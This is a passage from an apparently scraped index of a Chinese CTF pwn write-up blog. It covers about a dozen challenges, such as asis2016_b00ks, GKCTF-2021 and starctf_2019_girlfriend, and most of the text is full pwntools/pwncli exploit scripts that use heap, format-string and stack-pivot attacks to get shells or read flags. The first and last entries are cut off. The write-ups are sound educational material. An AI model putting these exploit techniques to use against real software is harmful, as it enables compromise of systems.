p.sendlineafter(\"Enter the book id you want to edit: \", str(idx)) p.sendlineafter(\"Enter new book description: \", desc) def show(): p.sendlineafter(\"\u003e \", \"4\") return p.recvuntil(\"\\n1. Create a book\") def change_name(name): p.sendlineafter(\"\u003e \", \"5\") p.sendlineafter(\"Enter author name: \", name) author_name() create(0xc0, \"a\\n\", 0x30, flat(0, 0x141, \"\\x01\\n\")) create(0x60, \"a\\n\", 0x60, \"a\\n\") change_name(\"a\"*0x20) delete(1) create(0x20, \"a\\n\", 0x60, \"a\\n\") msg = show() idx = msg.index(b\"\\x7f\") + 1 libc_base_addr = u64(msg[idx - 6:idx].ljust(8, b\"\\x00\")) - 0x3c4b78 log_address(\"libc_base_addr\", libc_base_addr) libc.address = libc_base_addr one_gadget = libc.offset_to_vaddr(0x4526a) log_address(\"one_gadget\", one_gadget) stop() delete(2) edit(3, flat([[0] * 5, 0x71, libc.sym['__malloc_hook'] - 0x23, \"\\n\"])) create(0x60, \"a\\n\", 0x60, \"a\\n\") p.sendlineafter(\"\u003e \", \"1\") p.sendlineafter(\"\\nEnter book name size: \", str(0x60)) p.sendafter(\"Enter book name (Max 32 chars): \", flat([\"a\" * 11, one_gadget, libc.sym['realloc'] + 13, \"\\n\"])) p.sendlineafter(\"\\nEnter book description size: \", str(0)) p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-20","objectID":"/zh-cn/2021-08-20-asis2016-b00ks/:0:0","tags":["pwn"],"title":"asis2016_b00ks","uri":"/zh-cn/2021-08-20-asis2016-b00ks/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： 总结一个特殊的largebin attack，其实也不特殊，照着源码就能看出来，但是往往很少有题目这么考。即在往堆头节点插入大小相同的chunk时，若更改了堆头节点的fd，即可有一次任意地址写堆地址的机会。 tcache bin stash unlink，对于smallbin来说，若需要任意地址写堆地址，那么tcache bin里面填6个，然后伪造victim的bk的bk。利用bck-\u003efd = victim任意地址写。如果需要任意地址分配，则只需填满5个即可，并需要victim的bk1的bk2的bk需要可写。可以往__malloc_hook上方走，劫持__malloc_hook，然后观察寄存器，寻找合适的gadget进行后续的利用。 题目分析\rChecksec\rlibc版本为2.29 漏洞分析\r漏洞很明显，throw分支一个UAF： 然后在gift分支，可进行栈迁移： 但是需要堆上某个地址的内容需要大于等于0x7f0000000000。 利用思路\r关于本题，有三个利用思路： 思路一：\r利用栈上残存的信息，将0x1010的那个大chunk给释放掉，然后再分配到指定地方进行赋值，即可触发栈迁移。 栈如下： 可以泄露地址，还可以通过更改idx = 2的内容，实际改的时栈上的指针，因此可以去释放0x1010大小的这个chunk。这应该是非预期解之一，因为本题存储堆指针的区域并未置空。 思路二：\r利用tcachebin stash unlink，可以将目标区域刷为一个libc地址，就能绕过校验，然后进行栈迁移，利用rop读取flag。 利用的区域的libc源码为： 思路三：\r利用0x410大小的largebin，进行largebin attack。这个大小的chunk既在tcachebin的范围，也在largebin的范围。当插入相同大小的chunk时，若存在堆头节点，则可以修改fd，然后让任意地址写堆地址，这个时候需要错位1个字节，因为堆地址都是0x55/56开头，明显小于0x7f。 利用的源码在： 利用的时候，效果如下： Exp\r直接把三种思路的都放一起，分别是3个attack函数： #!/usr/bin/python3 from pwncli import * cli_script() libc:ELF = gift['libc'] idx_size = {1:0x10, 2:0xf0, 3:0x300, 4:0x400} context.buffer_size=0x1000 def get(p:tube, idx, sizeidx, content=None): if content is None: content = \"a\\n\" p.sendlineafter(\"Your input: \", \"1\") p.sendlineafter(\"Please input the red packet idx: \", str(idx)) p.sendlineafter(\"How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): \", str(sizeidx)) p.sendafter(\"Please input content: \", content) def throw(p:tube, idx): p.sendlineafter(\"Your input: \", \"2\") p.sendlineafter(\"Please input the red packet idx: \", str(idx)) # only one time def change(p:tube, idx, content): p.sendlineafter(\"Your input: \", \"3\") p.sendlineafter(\"Please input the red packet idx: \", str(idx)) p.recvuntil(\"Please input content: \") p.send(content) def watch(p:tube, idx): p.sendlineafter(\"Your input: \", \"4\") p.sendlineafter(\"Please input the red packet idx: \", str(idx)) msg = p.recvline() info(\"recv msg:{}\".format(msg)) return u64(msg[:-1].ljust(8, b\"\\x00\")) def stack_overflow(p:tube, content): p.sendlineafter(\"Your input: \", \"666\") p.sendafter(\"What do you want to say?\", content) def exit_p(p:tube): p.sendlineafter(\"Your input: \", \"5\") def get_rop(libc_base_addr, fill_chunk_addr): rax_ret = libc_base_addr + 0x47cf8 rdi_ret = libc_base_addr + 0x26542 rsi_ret = libc_base_addr + 0x26f9e rdx_ret = libc_base_addr + 0x12bda6 sys_ret = libc_base_addr + 0xcf6c5 rop = flat(rdi_ret, fill_chunk_addr, rsi_ret, 0, rax_ret, 2, sys_ret, rdi_ret, 3, rsi_ret, fill_chunk_addr+0x350, rdx_ret, 0x30, rax_ret, 0, sys_ret, rdi_ret, 1, rsi_ret, fill_chunk_addr+0x350, rdx_ret, 0x30, rax_ret, 1, sys_ret) return rop # use stack pivot def attack(p:tube): # leak heap address get(p, 5, 4) leak_heap_addr = watch(p, 2) log_address(\"leak_heap_addr\", leak_heap_addr) heap_base_addr = leak_heap_addr - 0x1270 # leak libc addr leak_libc_addr = watch(p, 3) libc_base_addr = leak_libc_addr - 0x2199f0 libc.address = libc_base_addr log_address(\"libc_base_addr\",libc_base_addr) # to free chunk 0x1010 victim_address = heap_base_addr + 0x260 change(p, 2, p64(victim_address)) throw(p, 5) # to fill 0x800 to 0x7fffffffffff get(p, 0, 2) get(p, 1, 4) # rop payload fill_chunk_addr = heap_base_addr + 0x770 rop = get_rop(libc_base_addr, fill_chunk_addr) payload = flat({ 0:\"/flag\".ljust(8, \"\\x00\"), 0x18: rop, 0x2e8: 0, 0x2f0: 0x7fffffffffff, 0x2f8: 0 }, filler=\"\\x00\") get(p, 3, 4, payload) # stack pivot and exec rop to get flag payload = flat({ 0x80:fill_chunk_addr+0x10, 0x88:libc_base_addr+0x58373 }, filler=\"\\x00\", length=0x90) stack_overflow(p, payload) p.interactive() # use tcache stash attack def attack2(p:tube): chunk_type = 4 # leak addr for i in range(8): get(p, i, chunk_type) get(p, 8, 1) # gap get(p, 9, chunk_type) get(p, 10, 1) # gap # leak heap addr throw(p, 0) throw(p, 1) leak_heap_addr = watch(p, 1) heap_base_addr = leak_heap_addr - 0x1270 log_address(\"heap_base_addr\", heap_base_addr) # fill 0x400 7 for i in range(2, 7): throw(p, i) # fill 0x100 6 for i in range(6): get(p, i, 2) throw(p, i) # leak libc addr throw(p, 7) leak_libc_","date":"2021-08-18","objectID":"/zh-cn/2021-08-18-redpacket-soeasypwn/:0:0","tags":["pwn"],"title":"RedPacket_SoEasyPwn","uri":"/zh-cn/2021-08-18-redpacket-soeasypwn/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： 算是很简单的shellcode的题，需要手写shellcode 在写shellcode之前，可以先观察下寄存器状态，比如这题就可以很巧妙的去运用read的系统调用 使用xchg交换两个寄存器的值，是一个很方便的指令 题目分析\rChecksec\r题目使用的环境为ubuntu-18.04 函数分析\rSettreasure\r流程为： 申请两个大小为0x1000的匿名映射段 往sea上拷贝了一段shellcode，但是拷贝的位置不可知，是随机的 把data段上的shellcode给清零了 Treasure\r主要流程为： 将code段的权限改为rwx。这里虽然传入的是0xa，但是mprotect的改变权限的内存大小按照页对齐。 允许写入9个字节的shellcode 然后执行shellcode 利用思路\r这里要写shellcode，但是只能写9个字节，所以写之前先打个断点看下寄存器的状态： 观察一下： rax为0 rdi为0 rdx为code+1处 rsi为0x400c2a 这个时候，交换一下rsi和rdx的值，然后再syscall，就是直接调用read，这个时候再写入比较长的shellcode然后再call rsi即可。那么只需要三条指令：xchg rdi, rdx; syscall; call rsi，肯定不会超过9字节啦。实测发现只有7个字节。 Exp\r调试过程\r这里我选择填入cat /flag的shellcode。需要注意的是，需要跳过前5个字节，调试过程如下： 触发read： 写入shellcode读取flag： 完整exp\rfrom pwncli import * cli_script() p:tube = gift['io'] p.sendlineafter(\"will you continue?(enter 'n' to quit) :\", \"y\") payload = asm(\"xchg rdx, rsi;syscall;call rsi\") p.sendafter(\"start!!!!\", payload) p.sendline(b\"a\"*5 + asm(shellcraft.cat(\"./flag\"))) p.interactive() 最后远程打： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-15","objectID":"/zh-cn/2021-08-15-%E9%B9%8F%E5%9F%8E%E6%9D%AF-2018-treasure/:0:0","tags":["pwn"],"title":"鹏城杯_2018_treasure","uri":"/zh-cn/2021-08-15-%E9%B9%8F%E5%9F%8E%E6%9D%AF-2018-treasure/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： 如果程序的栈溢出只覆盖到rbp，那么大概率也是考栈迁移，只是刚好当前函数结束后会执行依次leave; ret，然后上层函数还有一次leave; ret 合理利用程序中的gadgets，比如call puts指令等。劫持了rdi之后衔接一个call puts，即可泄露地址 题目分析\rChecksec\r函数分析\rVuln\r这个哈希函数是怎么看出来的呢？一半靠经验，一般靠猜 Md5_hash\r经验： 猜测某个字符的md5为： 这里需要转换一下字节序，后来一试，就是admin，也就是说user=admin passwd=admin 利用过程\r第一次栈迁移 需要注意的是，迁移后的栈只有0x18个字节的操作空间，如果执行个pop rdi; ret | rdi_value，就只剩返回地址了。这个时候可以利用： 刚好可以泄露地址，又可以执行第二遍栈迁移 第二次栈迁移，此时的栈已经在data段上了，那么直接上one_gadget肯定可以滿足条件，因为$sp+0x70之类的，大概率是0。此时需要注意的是，由于栈迁移到了data上，所以构造payload也需要格外注意一下，可以调试着去构造payload Exp\rfrom pwncli import * cli_script() p = gift['io'] libc = gift['libc'] gadget = 0x4527a pop_rdi_ret = 0x401ab3 puts_got_addr = 0x602028 call_puts_addr = 0x4018b5 s1_addr = 0x602400 payload1 = flat({ 0:\"admin\\x00\\x00\\x00\", 8: [pop_rdi_ret, puts_got_addr, call_puts_addr] }) payload2 = flat({ 0:\"admin\\x00\\x00\\x00\", 0x20:s1_addr }, length=0x28, filler=\"\\x00\") # stack pivot p.sendafter(\"\u003e\", payload1) p.recvuntil(\"u Pass\\n\") p.sendafter(\"\u003e\", payload2) msg = p.recvuntil(\"\\x7f\") libc_base_addr = u64(msg[-6:].ljust(8, b\"\\x00\")) - libc.sym['puts'] log_address(\"libc_base_addr\", libc_base_addr) one_gadget_addr = libc_base_addr + gadget payload1 = flat({ 0:\"admin\\x00\\x00\\x00\", 8: [0, 0, one_gadget_addr] }) payload2 = flat({ 0:\"admin\\x00\\x00\\x00\", 0x10:\"admin\\x00\\x00\\x00\", 0x20:s1_addr }, length=0x28, filler=\"\\x00\") # pivot again p.sendafter(\"\u003e\", payload1) p.recvuntil(\"u Pass\\n\") p.sendafter(\"\u003e\", payload2) p.interactive() 泄露地址与第一次栈迁移： 拿到shell： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-14","objectID":"/zh-cn/2021-08-14-gkctf-2021-checkin/:0:0","tags":["pwn"],"title":"GKCTF-2021-checkin","uri":"/zh-cn/2021-08-14-gkctf-2021-checkin/"},{"categories":["pwn-wp"],"content":"解题思路\r简单的printf，修改printf@got为system然后再输入/bin/sh获取shell Exp\rfrom pwncli import * cli_script() p = gift['io'] e = gift['elf'] libc = gift['libc'] p.sendline(\"%41$p,%43$p\") msg = p.recvline() code_addr, libc_addr = msg.split(b\",\") code_base_addr = int16(code_addr.decode()) - e.sym['main'] - 74 libc_base_addr = int16(libc_addr.decode()) - libc.sym['__libc_start_main'] - 240 e.address = code_base_addr libc.address = libc_base_addr log_address(\"code_base_addr\", code_base_addr) payload = fmtstr_payload(offset=6, writes={e.got['printf']:libc.sym['system']}, write_size=\"short\", write_size_max=\"short\") p.sendline(payload) sleep(1) p.sendline(\"/bin/sh\") p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-14","objectID":"/zh-cn/2021-08-14-inndy-echo2/:0:0","tags":["pwn"],"title":"inndy_echo2","uri":"/zh-cn/2021-08-14-inndy-echo2/"},{"categories":["pwn-wp"],"content":"解题思路\r什么保护都没有，几乎是白给。经典的格式化字符串，这里选择修改printf的got表内容为system然后再输入/bin/sh拿shell Exp\rfrom pwncli import * cli_script() p = gift['io'] libc = gift['libc'] def fmt_attack(p, fmt): p.sendlineafter(\"3) Exit\\n\", \"1\") p.sendline(fmt) p.sendlineafter(\"3) Exit\\n\", \"2\") msg = p.recvline() info(\"msg recv: {}\".format(msg)) return msg msg = fmt_attack(p, \"%275$p\") libc_base_addr = int16(msg.decode()) - libc.sym['__libc_start_main'] -241 libc.address = libc_base_addr log_address(\"libc_base_addr\", libc_base_addr) payload = fmtstr_payload(offset=16, writes={0x804a010:libc.sym['system']}, write_size=\"short\", write_size_max=\"short\") fmt_attack(p, payload) p.sendlineafter(\"3) Exit\\n\", \"1\") p.sendline(\"/bin/sh\") p.sendlineafter(\"3) Exit\\n\", \"2\") p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-14","objectID":"/zh-cn/2021-08-14-actf-2019-onerepeater/:0:0","tags":["pwn"],"title":"ACTF_2019_OneRepeater","uri":"/zh-cn/2021-08-14-actf-2019-onerepeater/"},{"categories":["pwn-wp"],"content":"总结\r常规的fastbin attack，劫持__malloc_hook为realloc+2，然后__realloc_hook为one_gadget即可 题目分析\rChecksec\r题目环境为ubuntu-16.04 函数分析\r恢复下girlfriend的结构体： struct Girl { char *name_ptr; _DWORD size; char phone[12]; }; 漏洞点在call_girlfriend的时候的UAF: Exp\rfrom pwncli import * cli_script() p = gift['io'] elf = gift['elf'] if gift['debug']: gadget = 0xf1207 libc = gift['libc'] else: gadget = 0xf1147 libc = ELF(\"./libc-2.23.so\") def add(size, name=\"a\",phone=\"b\"): p.sendlineafter(\"Input your choice:\", \"1\") p.sendlineafter(\"Please input the size of girl's name\\n\", str(size)) p.sendafter(\"please inpute her name:\\n\", name) p.sendafter(\"please input her call:\\n\", phone) def show(idx): p.sendlineafter(\"Input your choice:\", \"2\") p.sendlineafter(\"Please input the index:\\n\", str(idx)) p.recvuntil(\"name:\\n\") name = p.recvline() p.recvuntil(\"phone:\\n\") phone = p.recvline() info(\"recv name:{} phone:{}\".format(name, phone)) return name, phone def call(idx): p.sendlineafter(\"Input your choice:\", \"4\") p.sendlineafter(\"Please input the index:\\n\", str(idx)) # fastbin attack # leak libc addr to get malloc addr # use one_gadget to get shell add(0x80) add(0x60) add(0x60) call(0) name, _= show(0) leak_libc_addr = u64(name[:-1].ljust(8, b\"\\x00\")) log_address(\"leak_libc_addr\", leak_libc_addr) libc_base_addr = leak_libc_addr - 0x3c4b78 log_address(\"libc_base_addr\", libc_base_addr) libc.address = libc_base_addr call(1) call(2) call(1) add(0x60, p64(libc.sym[\"__malloc_hook\"] - 0x23)) add(0x60) add(0x60) # 0x45226 0x4527a 0xf0364 0xf1207 payload = flat([\"a\" * 11, libc_base_addr + gadget, libc.sym['realloc']+2]) add(0x60, payload) p.sendlineafter(\"Input your choice:\", \"1\") p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-14","objectID":"/zh-cn/2021-08-15-starctf-2019-girlfriend/:0:0","tags":["pwn"],"title":"starctf_2019_girlfriend","uri":"/zh-cn/2021-08-15-starctf-2019-girlfriend/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： 碰到分支比较复杂，流程比较长的题目，首先定位一下有没有泄露出flag的地方，有没有执行system(\"/bin/sh\")的地方，可以快速定位到漏洞点 对于off by null漏洞，需要借助系统残留的fd和bk指针进行unlink，而且一般是三明治结构，低地址的chunk是被unlink的对象，中间夹着可能正在使用的chunk，高地址的chunk则是被释放，并触发合并操作 有些版本的2.23已经加上了对presize的检查，需要注意伪造 dl_iterate_phdr函数会迭代访问所有的共享对象，然后每个对象都调用回调函数进行处理，可以对共享so进行操作 题目分析\rChecksec\r保护全开，根据给的libc.so.6可以查到版本位2.23 函数分析\r本题主要是实现了bash的部分功能，感觉可以参考着出个题。这里只分析主要的函数。 Main\r主要流程为： 初始化三个文件流 获取主机名、用户名等进行登录 获取到当前的路径，然后获取用户的输入 处理用户的输入，用空格分隔用户的输入，并且每个子串都调用malloc分配一个chunk，存储用户输入的字符串 判断输入的第一个子串是否是一个有效的命令，如果是有效的命令，则调用exec_cmd进行相应的处理，否则抛出个错误 释放给用户输入字符分配的内存 Get_input_process\rExec_cmd\r就是根据第一个子串判断是否执行对应的命令 漏洞点\r漏洞点找到了两个： get_input_process中的strcpy存在off by null漏洞 monitor命令中，如果__malooc_hook的前7个字符位monitor，则会执行system(\"/bin/sh\") 利用思路\r利用步骤： 使用off by null先堆风水 利用echo来泄露出main_arena+88的地址 利用0x70大小的fastbin chunk分配到__malloc_hook上方，修改为monitor即可拿到题目给的shell 需要注意的是，在伪造presize和size的时候，需要用strcpy来逐步一个字节一个字节的去刷零 Exp\rfrom pwncli import * cli_script() p = gift['io'] def exec_cmd(*cmd): jo = \" \" if isinstance(cmd[0], bytes): jo = b\" \" p.sendlineafter(\"$ \", jo.join(cmd).strip()) # four chunks exec_cmd(\"a\" * 0x90, \"a\" * 0x60, \"a\" * 0xf0, \"a\" * 0x10) # off by null exec_cmd(\"a\" * 0x68) # clear for i in range(1, 9): exec_cmd(\"a\" * (0x68 - i)) # unlink exec_cmd(\"a\" * 0x60 + \"\\x10\\x01\", \"a\" * 0xf0) # # split chunk 0x110 ... exec_cmd(\"a\" * (0x100 - 1), \"a\" * 0x30, \"a\" * 0x30, \"a\" * 0x30, \"a\" * 0x30) # clear and set 0x71 exec_cmd(\"a\" * 0x9f) for i in range(1, 7): exec_cmd(\"a\" * (0x9f - i - 1) + \"\\x71\") # leak addr exec_cmd(\"echo\", \"a\" * (0x60 - 1), \"a\" * (0x90 - 1)) leak_libc_addr = p.recvuntil(\" a\")[:-2] leak_libc_addr = u64(leak_libc_addr.ljust(8, b\"\\x00\")) log_address(\"leak_libc_addr\", leak_libc_addr) libc_base_addr = leak_libc_addr - 0x3c4b78 log_address(\"libc_base_addr\", libc_base_addr) exec_cmd(\"a\" * 0xa7) exec_cmd(\"a\" * 0xa6) target = libc_base_addr + 0x3c4b10 - 0x23 exec_cmd(b\"a\"*0xa0+p64(target)[:-2]) # fastbin attack exec_cmd(\"a\" * 0x9f) for i in range(1, 7): exec_cmd(\"a\" * (0x9f - i - 1) + \"\\x71\") exec_cmd(\"monitor\", \"a\" * 0x60, \"a\"*0x13 + \"monitora\" + \"a\" * 0x45) p.interactive() 远程打： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-01","objectID":"/zh-cn/2021-08-01-gkctf-2021-esapesh/:0:0","tags":["pwn"],"title":"GKCTF-2021-EsapeSH","uri":"/zh-cn/2021-08-01-gkctf-2021-esapesh/"},{"categories":["pwn-wp"],"content":"解题思路\r题目还挺有趣的，点在于需要循环进行fmt_attack。栈上某个地址存储着fmt_attack_flag，当其不为0的时候，会直接执行exit退出。因此，需要尝试寻找一个地址，该地址存储着fmt_attack_flag的地址。因此，解题思路为： 修改fmt_attack_flag为0的时候，同时泄露出栈上存储的代码段基地址和libc基地址 利用栈上的格式化字符串泄露出secret 利用栈上的格式化字符串修改stdout的fileno为2 然后执行get_flag输入secret即可得到flag Exp\r#!/usr/bin/python3 from pwncli import * cli_script() if gift['debug']: libc = gift['libc'] elif gift['remote']: libc = ELF('/root/LibcSearcher/libc-database/other_libc_so/libc-2.23.so') # offset = 8 def fmt_attack(p:tube, fmt_str): p.sendlineafter(\"\u003e\u003e\", \"2\") p.send(fmt_str) def get_flag(p:tube, secret): p.sendlineafter(\"\u003e\u003e\", \"3\") p.sendafter(\"If you can open the door!\\n\", secret) def attack(p:tube): p.recvuntil(\"tell me the time:\") for _ in range(3): p.sendline(str(0xdeadbeef)) payload = \"%7$hhn%17$p,%23$p\\n\" fmt_attack(p, payload) leak_msg = p.recvline() code_addr, libc_addr = leak_msg.strip().split(b',') code_addr = int16(code_addr.decode()) libc_addr = int16(libc_addr.decode()) log_address(\"code_addr\", code_addr) log_address(\"libc_addr\", libc_addr) code_base_addr = code_addr - 118 - 0xfb6 libc_base_addr = libc_addr - libc.sym['__libc_start_main'] - 240 log_address(\"code_base_addr\", code_base_addr) log_address(\"libc_base_addr\", libc_base_addr) # stdout_addr = libc.sym['_IO_2_1_stdout_'] secret_addr = code_base_addr + 0x202060 stdout_flag_addr = libc_base_addr + libc.sym['_IO_2_1_stdout_'] + 112 # payload = b\"%2c%10$hhn%11$sa\" + p64(stdout_flag_addr)+ p64(secret_addr) payload = flat([\"%7$hhn%d,%10$saa\", secret_addr, \"\\n\"]) fmt_attack(p, payload) leak_msg = p.recvline() secret_msg = leak_msg[leak_msg.find(b',')+1:-1] if len(secret_msg) \u003c 0x40: p.close() sys.exit() secret_msg = secret_msg[:0x40] info(\"secret msg: {}\".format(secret_msg)) # stop() payload = flat([\"aa%9$hhn\", stdout_flag_addr]) fmt_attack(p, payload) get_flag(p, secret_msg) p.interactive() attack(gift['io']) 泄露地址： 泄露secret： 修改stdout.flieno： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-07-18","objectID":"/zh-cn/2021-07-18-wustctf2020-babyfmt/:0:0","tags":["pwn"],"title":"wustctf2020_babyfmt","uri":"/zh-cn/2021-07-18-wustctf2020-babyfmt/"},{"categories":["pwn-wp"],"content":"解题思路\r一道很有趣的虚拟机的题目，抽象实现了一套寄存器、代码段、数据段。解题思路如下： 利用一系列操作，将一个libc的地址放置在寄存器中 打印寄存器，即可得到libc地址 再利用寄存器写内存操作，将__free_hook写为system，释放/bin/sh块即可 Exp\rexp中都写得很详细了 #! python3 # gengerate gdb-script gdb_script_content = \\ \"\"\"def show_info x /24wx $rebase(0x202040) x /24wx $rebase(0x242060) telescope $rebase(0x202040) telescope \u0026__free_hook end \"\"\" with open(\"./script\", mode='w', encoding='utf-8') as f: f.writelines(gdb_script_content) from pwncli import * from functools import partial cli_script() sh = gift['io'] if gift['debug']: libc = sh.elf.libc else: libc = ELF('/root/LibcSearcher/libc-database/other_libc_so/libc-2.23.so') def generate_mem(three:int, two:int, one:int, operation:int) -\u003e int: assert operation \u003e= 0 and operation \u003c 0x100 assert three \u003e= 0 and three \u003c 0x10 assert two \u003e= 0 and two \u003c 0x10 assert one \u003e= 0 and one \u003c 0x10 return ((operation \u003c\u003c 24) | (three \u003c\u003c 16) | (two \u003c\u003c 8) | (one)) op_assign = partial(generate_mem, operation=0x10) op_bool = partial(generate_mem, operation=0x20) op_mem2reg = partial(generate_mem, operation=0x30) op_reg2mem = partial(generate_mem, operation=0x40) op_reg2stack = partial(generate_mem, operation=0x50) op_stack2reg = partial(generate_mem, operation=0x60) op_add = partial(generate_mem, operation=0x70) op_minus = partial(generate_mem, operation=0x80) op_and = partial(generate_mem, operation=0x90) op_or = partial(generate_mem, operation=0xa0) op_xor = partial(generate_mem, operation=0xb0) op_lmov = partial(generate_mem, operation=0xc0) op_rmov = partial(generate_mem, operation=0xd0) op_exit = partial(generate_mem, operation=0xe0) op_again = partial(generate_mem, operation=0xf0) op_show_exit = partial(generate_mem, operation=0xff) pc = 0 sp = 0 offset = libc.sym['__free_hook'] - libc.sym['read'] - 8 target_offset = 0xf0000000 | offset codes = [ 0x0f000000, # helper var 0xf0000000, # helper var 0xf0ffffd0, # codes[0] | codes[2] = -48 ---\u003e read@got 0xf0fffff8, # codes[0] | codes[3] = -8 ---\u003e comment[0] target_offset, # codes[4] - codes[1] = offset # 0 ---\u003e r0 op_bool(1, 0, 0), # 1 ---\u003e r1 op_add(2, 1, 1), # 2 ---\u003e r2 op_add(3, 2, 1), # 3 ---\u003e r3 op_add(4, 2, 2), # 4 ---\u003e r4 op_mem2reg(5, 1, 0), # mem[0] ---\u003e r5 0x0f000000 op_mem2reg(6, 1, 1), # mem[1] ---\u003e r6 0xf0000000 op_mem2reg(7, 1, 2), # mem[2] ---\u003e r7 0xf0ffffd0 op_mem2reg(8, 1, 3), # mem[3] ---\u003e r8 0xf0fffff8 op_mem2reg(9, 1, 4), # mem[4] ---\u003e r9 target_offset op_minus(9, 9, 6), # target_offset - 0xf0000000 = offset ---\u003e r9 op_or(7, 7, 5), # r7 | r5 = 0xf0ffffd0 | 0x0f000000 = -48 ---\u003e r7 op_or(8, 8, 5), # r8 | r5 = 0xf0fffff8 | 0x0f000000 = -8 ---\u003e r8 op_mem2reg(10, 0, 7), # (read_addr \u0026 0xfffff) ---\u003e r10 op_add(10, 10, 9), # r10 + r9 = (read_addr \u0026 0xfffff) + offset = (__free_hook_addr \u0026 0xffffffff) ---\u003e r10 op_reg2mem(10, 0, 8), # (__free_hook_addr \u0026 0xffffffff) ---\u003e comment[1] op_minus(7, 7, 1), # -49 ---\u003e r7 op_add(8, 8, 1), # -7 ---\u003e r8 op_mem2reg(11, 0, 7), # (read_addr \u003c\u003c 32) \u0026 0xffffffff ---\u003e r11 op_reg2mem(11, 0, 8), # (read_addr \u003c\u003c 32) \u0026 0xffffffff ---\u003e comment[0] op_reg2mem(7, 0, 15), # 0xffffffd0 ---\u003e mem[pc] op_show_exit(0, 0, 0) ] code_size = len(codes) sh.sendlineafter(\"PC: \", str(pc)) sh.sendlineafter(\"SP: \", str(sp)) sh.sendlineafter(\"CODE SIZE: \", str(code_size)) sh.recvuntil(\"CODE: \") for i in codes: sh.sendline(str(i)) sh.recvuntil(\"R10: \") msg = sh.recvline() lower_addr = int16(msg[:-1].decode()) sh.recvuntil(\"R11: \") msg = sh.recvline() higher_addr = int16(msg[:-1].decode()) free_hook_addr = (higher_addr \u003c\u003c 32) + lower_addr + 8 libc.address = free_hook_addr - libc.sym['__free_hook'] log_address(\"free_hook_addr\", free_hook_addr) log_address(\"libc_base_addr\", libc.address) sh.sendafter(\"y\", flat(\"/bin/sh\\x00\", libc.sym['system'])) sh.interactive() 泄露地址: 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-07-18","objectID":"/zh-cn/2021-07-18-ogeek2019-final-ovm/:0:0","tags":["pwn"],"title":"OGeek2019-Final-OVM","uri":"/zh-cn/2021-07-18-ogeek2019-final-ovm/"},{"categories":["pwn-wp"],"content":"解题思路\r利用溢出修改指针的洞，将指针修改到stdout结构体上方，修改flag为0xfbad1800，然后修改IO_write_base为__environ地址，IO_write_ptr为__environ + 8地址，泄露栈地址 劫持__libc_start_main栈帧的retaddr，使用rop执行system(\"/bin/sh\") 这里用pwncli来写exp，只图高效，快捷 Exp\r#!/usr/bin/python3 from pwncli import * cli_script() if gift['remote']: libc = ELF('libc-2.23.so') elif gift['debug']: libc = gift['libc'] def add_page(p, size, name): p.sendlineafter(\"Your choice-\u003e \\n\",\"1\") p.sendlineafter(\"Length: \\n\", str(size)) p.sendafter(\"name:\\n\", name) p.recvline() def edit_page(p, name, content): p.sendlineafter(\"Your choice-\u003e \\n\",\"2\") p.recvline() p.send(name) p.sendafter(\"contents:\\n\", content) def show_page(p): p.sendlineafter(\"Your choice-\u003e \\n\",\"3\") msg1 = p.recvline() msg2 = p.recvline() return msg1, msg2 def get_gift(p): p.sendlineafter(\"Your choice-\u003e \\n\",\"666\") msg = p.recvline() info(msg) return msg def attack(p): # leak libc addr leak_libc_addr = int16(get_gift(p).decode()) libc.address = leak_libc_addr - libc.sym['puts'] log_address(\"libc base addr\", libc.address) stdout_addr = libc.sym['_IO_2_1_stdout_'] environ_addr = libc.sym['__environ'] # hijack stdout to leak stack addr add_page(p, 0x100, flat(0xdeadbeef, stdout_addr)) edit_page(p, \"a\", flat([0xfbad1800, [environ_addr] * 4, environ_addr + 8])) # get stack addr leak_stack_addr = u64(p.recvn(8)) log_address(\"leak_stack_addr\", leak_stack_addr) stackframe_ret_addr = leak_stack_addr - 0xf0 # rop bin_sh_offset = libc.search(b\"/bin/sh\").__next__() rop = ROP(libc, base=libc.address) rop.call('system', [bin_sh_offset]) payload = rop.chain() p.sendlineafter(\"Your choice-\u003e \",\"2\") p.sendafter(\"name:\", flat(0xdeadbeef, stackframe_ret_addr)) p.sendafter(\"contents:\", payload) p.sendlineafter(\"Your choice-\u003e \",\"5\") p.interactive() attack(gift['io']) 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-07-18","objectID":"/zh-cn/2021-07-18-ciscn-2019-n-7/:0:0","tags":["pwn"],"title":"ciscn_2019_n_7","uri":"/zh-cn/2021-07-18-ciscn-2019-n-7/"},{"categories":["pwn-wp"],"content":"总结\r很基础的unlink，只记录下exp，不对题目做过多的分析。注意一点，对于含有tcache bin的glibc版本，需要先把tcache bin填满，再unlink。 EXP\rfrom pwn import * int16 = lambda x : int(x, base=16) LOG_ADDR = lamda: x, y: log.info(\"Addr: {} ===\u003e {}\".format(x, y)) sh:tube = process(\"./ciscn_2019_es_4\") context.arch=\"amd64\" libc = ELF('libc-2.27.so') def ma(idx, size, data) -\u003e int: assert idx \u003e -1 and idx \u003c 0x21, \"idx error!\" assert size \u003e 0x7f and idx \u003c 0x101, \"size error!\" sh.sendlineafter(\"4.show\\n\", \"1\") sh.sendlineafter(\"index:\\n\", str(idx)) sh.sendlineafter(\"size:\\n\", str(size)) gift = sh.recvline() info(\"msg recv:{}\".format(gift)) leak_addr = int16(gift[6:-1].decode()) info(\"leak addr:0x%x\" % leak_addr) sh.sendafter(\"content:\\n\", data) return leak_addr def fr(idx): sh.sendlineafter(\"4.show\\n\", \"2\") sh.sendlineafter(\"index:\\n\", str(idx)) edit_flag = 0 def ed(idx, data): global edit_flag assert edit_flag != 2, \"cannot edit!\" 